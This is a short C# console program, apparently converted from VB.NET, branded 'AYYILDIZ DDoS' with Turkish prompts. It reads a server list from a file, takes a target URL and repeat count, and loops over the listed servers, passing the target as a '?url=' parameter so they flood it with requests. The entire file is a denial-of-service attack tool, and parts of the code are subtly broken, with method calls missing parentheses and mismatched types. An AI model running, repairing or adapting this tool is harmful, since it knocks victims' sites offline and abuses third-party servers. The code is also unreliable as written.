using Microsoft.VisualBasic;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.IO;

static class Module1
{
	static int repeatcount;
	public static void Main()
	{
		try {
			Console.Title = "AYYILDIZ DDoS [by CreativeHP]";
			Console.WriteLine("");
			Console.WriteLine("      #                                         ");
			Console.WriteLine("     # #   #   # #   # # #      #####  # ###### ");
			Console.WriteLine("    #   #   # #   # #  # #      #    # #     #  ");
			Console.WriteLine("   #     #   #     #   # #      #    # #    #   ");
			Console.WriteLine("   #######   #     #   # #      #    # #   #    ");
			Console.WriteLine("   #     #   #     #   # #      #    # #  #     ");
			Console.WriteLine("   #     #   #     #   # ###### #####  # ###### ");
			Console.WriteLine("");
			ArrayList serverlist = new ArrayList();
			Console.ForegroundColor = ConsoleColor.Cyan;
			try {
				string[] allLines = File.ReadAllLines(System.AppDomain.CurrentDomain.BaseDirectory + "list.txt");
				foreach (string line in allLines) {
					serverlist.Add(line);
				}
			} catch (Exception ex) {
				Interaction.MsgBox(ex.Message, MsgBoxStyle.Critical, "Error");
				Environment.Exit(0);
			}
			Console.Write("Hedef URL: ");
			Console.ResetColor();
			string target = Console.ReadLine;
			Console.ForegroundColor = ConsoleColor.Cyan;
			Console.Write("Tekrar Değeri: ");
			Console.ResetColor();
			try {
				repeatcount = Console.ReadLine;
			} catch (Exception ex) {
				repeatcount = 1;
			}
			Console.ForegroundColor = ConsoleColor.Green;
			Net.WebClient wc = new Net.WebClient();
			string a = null;
			try {
				string b = wc.DownloadString(target);
				a = b.Length;
			} catch (Exception ex) {
				a = "bilinmiyor";
			}
			for (int u = 0; u <= repeatcount; u++) {
				for (int i = 0; i <= serverlist.Count - 1; i++) {
					wc.DownloadString(serverlist.Item(i) + "?url=" + target);
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write("#" + u + " ");
					Console.ForegroundColor = ConsoleColor.Red;
					Console.Write(wc.Proxy.GetProxy(new Uri(target)).Authority);
					Console.ForegroundColor = ConsoleColor.Green;
					Console.Write("->yüklendi {\"" + serverlist.Item(i) + "\"}");
					Console.ForegroundColor = ConsoleColor.Red;
					Console.Write(" saldıranID:{" + i + "}");
					Console.ForegroundColor = ConsoleColor.White;
					Console.Write(" yüklemeBoyutu:{" + a + "}" + Constants.vbNewLine);
				}
			}
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("Bitti.");
			Console.ResetColor();
			Console.WriteLine("Çıkmak için herhangi bir tuşa basın.");
			Console.ReadKey(true);
		} catch (Exception ex) {
			Interaction.MsgBox(ex.Message, MsgBoxStyle.Critical, "Error");
			Environment.Exit(0);
		}
	}
}
